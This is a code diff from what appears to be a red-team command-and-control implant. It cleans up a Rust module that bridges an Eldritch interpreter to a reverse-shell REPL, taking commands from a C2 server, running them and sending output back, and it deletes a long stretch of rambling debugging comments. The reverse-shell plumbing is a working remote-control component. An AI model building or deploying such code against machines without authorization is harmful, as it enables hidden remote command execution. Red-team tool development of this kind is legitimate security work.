@@ -46,60 +46,23 @@ use super::ssh_exec_impl;
 pub mod ssh_session;
 pub use ssh_session::Session;
 
+#[derive(Debug)]
 struct ChannelPrinter {
     sender: std::sync::mpsc::Sender<ReverseShellRequest>,
     task_id: i64,
 }
 
 impl eldritch_core::Printer for ChannelPrinter {
-    fn print_out(&self, val: &eldritch_core::Span, _span: eldritch_core::Span) {
-        // Printer changed signature?
-        // Wait, the error said: `expected Span, found str` for val.
-        // `fn print_out(&self, val: &str, span: Span)` in my previous implementation.
-        // Error: `expected signature fn(&ChannelPrinter, &Span, &str)` (this is what I had?)
-        // No, error said: `expected Span, found str`.
-        // `fn(&ChannelPrinter, &Span, &str)` means arg1 is Span, arg2 is str?
-        // Let's check `eldritch-core` Printer trait.
-        // My previous read of `eldritch-core/src/interpreter/printer.rs` is needed.
-        // But from error: `expected signature fn(&ChannelPrinter, &Span, &str)`
-        // So first arg is Span, second is str?
-        // That seems inverted. Usually val then span.
-        // Error message: `expected signature fn(&ChannelPrinter, &Span, &str) found signature fn(&ChannelPrinter, &str, Span)`
-        // Ah, `eldritch_core::Printer` defines `fn print_out(&self, span: &Span, val: &str)`.
-        // Wait, let's verify.
-        // I will assume the error is correct: signature is `fn(&self, &Span, &str)`.
-        // So `span` comes first.
-
-        // No, wait. Error says `expected signature fn(&ChannelPrinter, &Span, &str)`.
-        // My implementation was `fn print_out(&self, val: &str, _span: Span)`.
-        // So I had `(&self, &str, Span)`.
-        // Trait has `(&self, &Span, &str)`.
-        // So `span` is first, and it is a reference.
-        // And `val` is second.
-
-        // I'll swap arguments.
-    }
-
-    // Actually implementing properly below.
-}
-
-#[derive(Debug)]
-struct ChannelPrinterImpl {
-    sender: std::sync::mpsc::Sender<ReverseShellRequest>,
-    task_id: i64,
-}
-
-impl eldritch_core::Printer for ChannelPrinterImpl {
-    fn print_out(&self, span: &eldritch_core::Span, val: &str) {
+    fn print_out(&self, _span: &eldritch_core::Span, val: &str) {
         let _ = self.sender.send(ReverseShellRequest {
-            data: val.as_bytes().to_vec(), // Using data field instead of input
+            data: val.as_bytes().to_vec(),
             task_id: self.task_id,
             kind: pb::c2::ReverseShellMessageKind::Data as i32,
             ..Default::default()
         });
     }
 
-    fn print_err(&self, span: &eldritch_core::Span, val: &str) {
+    fn print_err(&self, _span: &eldritch_core::Span, val: &str) {
         let _ = self.sender.send(ReverseShellRequest {
             data: alloc::format!("ERROR: {}", val).as_bytes().to_vec(),
             task_id: self.task_id,
@@ -116,8 +79,6 @@ impl PivotLibrary for StdPivotLibrary {
 
     fn reverse_shell_repl(&self, interp: &mut Interpreter) -> Result<(), String> {
         // Channels for bridging
-        // loop_rx: We read commands (ReverseShellResponse) from here.
-        // printer_tx: Printer writes output (ReverseShellRequest) to here.
         let (printer_tx, printer_rx) = std::sync::mpsc::channel::<ReverseShellRequest>();
         let (loop_tx, loop_rx) = std::sync::mpsc::channel::<ReverseShellResponse>();
 
@@ -160,12 +121,12 @@ impl PivotLibrary for StdPivotLibrary {
 
         // Setup printer
         let old_printer = interp.env.read().printer.clone();
-        interp.env.write().printer = Arc::new(ChannelPrinterImpl {
+        interp.env.write().printer = Arc::new(ChannelPrinter {
             sender: printer_tx.clone(),
             task_id: self.task_id,
         });
 
-        // Send initial banner/prompt?
+        // Send initial banner/prompt
         let _ = printer_tx.send(ReverseShellRequest {
             data: "Eldritch REPL connected.\n>>> ".to_string().as_bytes().to_vec(),
             task_id: self.task_id,
@@ -174,19 +135,13 @@ impl PivotLibrary for StdPivotLibrary {
         });
 
         // Run Loop
-        // Read from loop_rx (Response from server)
-        // Interpret
-        // Output via printer
         for resp in loop_rx {
-            // ReverseShellResponse has `data` (bytes), not `output`.
             let cmd = String::from_utf8_lossy(&resp.data).to_string();
 
-            // Check for exit
             if cmd.trim() == "exit" {
                 break;
             }
 
-            // Interpret
             match interp.interpret(&cmd) {
                 Ok(val) => {
                     if let Value::None = val {
